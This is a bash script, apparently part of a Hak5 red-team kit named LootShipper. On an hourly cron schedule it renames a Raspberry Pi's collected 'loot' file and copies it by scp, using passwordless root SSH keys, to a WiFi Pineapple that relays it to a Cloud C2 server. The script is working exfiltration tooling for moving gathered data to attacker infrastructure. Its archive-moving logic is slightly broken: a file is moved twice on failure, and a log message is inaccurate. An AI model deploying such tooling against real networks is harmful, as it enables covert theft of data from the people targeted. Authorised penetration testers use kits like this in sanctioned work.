#!/bin/bash
#
#
#                                       lOOT sHIPPER
#
#
# -----*********** >>>>>>>>>>>>>>     Raspberry Pi part     <<<<<<<<<<<<<< ***********-----
#
#
# The LootShipper bash script-set is used to get Raspberry Pi loot to Cloud C2 even
# though there is no client support for the Raspberry Pi (yet).
# But, Hak5 gear can be used as a broker to get loot to Cloud C2. This script (and
# the accompanying script on the chosen Hak5 device) needs to be adjusted according
# to the specific needs for the current scenario at hand.
#
# This script-set is based on the scenario that the Raspberry Pi collects loot and
# produces a text based loot file. This loot file is transfered to the chosen
# Hak5 device (in this case a WiFi Pineapple NANO to which the the Raspberry Pi
# is connected via the management AP) using scp. The scripts are not bullet
# proof and are for sure in need of certain improval. But, it has been created
# with the following in mind; "Don't let perfect get in the way of good enough".
#
# ---
#
# Raspberry Pi OS Lite and a Raspberry Pi Zero is enough to run these scripts,
# although the RPi firepower depends on the loot gathering activities conducted.
#
# This script assumes that ssh keys have been generated on the Raspberry Pi and
# that the public key is copied to the Hak5 device, i.e. on the Raspberry Pi do
# the following but enter no password, I know..... but we're all into security
# right :-)
# ssh-keygen -t rsa
# ssh-copy-id -i ~/.ssh/id_rsa.pub root@172.16.42.1
#
#
# This script is the Raspberry Pi part of the solution. It is intended to run as a
# cron job every hour @ minute 15 of the hour
# 15 * * * * /home/pi/lootshipper_rpi.sh >/dev/null 2>&1
#
# This script is expected to be located in /home/pi
#
# A loot directory is expected to exist in /home/pi, i.e. /home/pi/loot
#
# The loot file is always expected to be named "lootfile.ascii" and placed
# in the above mentioned loot directory
#
#
# The script is of course possible to use on any Linux based box (some tweaking may
# be necessary), and not just the Raspberry Pi.


# Get the current date and time to be used in log entries and to rename the loot file
DATENOW=$(/bin/date '+%Y-%m-%d %H:%M:%S')
TRIMDATENOW=$(/bin/date '+%Y%m%d%H%M%S')

# Set loot directory location
LOOTDIR="/home/pi/loot/"

# Set loot file name
LOOTFILE="lootfile.ascii"

# Set log file name
LOGFILE="loot.log"

# Set loot directory name
LOOTARCH="loot-archive"

# Check if there is any loot in the RPi loot directory, if not then exit the script
# after adding a comment to the log file
if [ ! -f "$LOOTDIR$LOOTFILE" ]; then
    /bin/echo "$DATENOW - Loot file does not exist at the moment, exiting....." >> $LOOTDIR$LOGFILE
    exit 1
fi

# Set new loot file name
LOOTUNIQUEFILE=$LOOTFILE$TRIMDATENOW

# Rename loot file
/bin/mv $LOOTDIR$LOOTFILE $LOOTDIR$LOOTUNIQUEFILE

# Create the loot archive directory if it is non existing
if [ ! -d "$LOOTDIR$LOOTARCH" ]; then
    /bin/mkdir -p "$LOOTDIR$LOOTARCH"
fi

# Copy the loot to the Hak5 device using scp, note that the /root/loot directory
# needs to exist on the Hak5 device and that the ssh public key of the Raspberry Pi
# should exist as well in /root/.ssh/authorized_keys on the Hak5 device
/usr/bin/scp $LOOTDIR$LOOTUNIQUEFILE root@172.16.42.1:/root/loot/

# Get the scp return code and save comments to a log file
# https://support.microfocus.com/kb/doc.php?id=7021696
RESULT=$?
if [ $RESULT -eq 0 ]; then
    # All OK! Save comment to log with timestamp
    /bin/echo "$DATENOW - Loot file $LOOTDIR$LOOTUNIQUEFILE successfully scp'd to Hak5 device and moved to Raspberry Pi based archive, exiting....." >> $LOOTDIR$LOGFILE    
else
    # Save comment to log with timestamp including result code from scp
    /bin/mv $LOOTDIR$LOOTUNIQUEFILE $LOOTDIR$LOOTARCH
    /bin/echo "$DATENOW - Unsuccessful in scp'ing the loot file $LOOTDIR$LOOTUNIQUEFILE to Hak5 device - scp result code = $RESULT, loot file moved to Raspberry Pi based archive, exiting....." >> $LOOTDIR$LOGFILE
fi

# Move loot file to archive regardless if scp was successful or not
/bin/mv $LOOTDIR$LOOTUNIQUEFILE $LOOTDIR$LOOTARCH
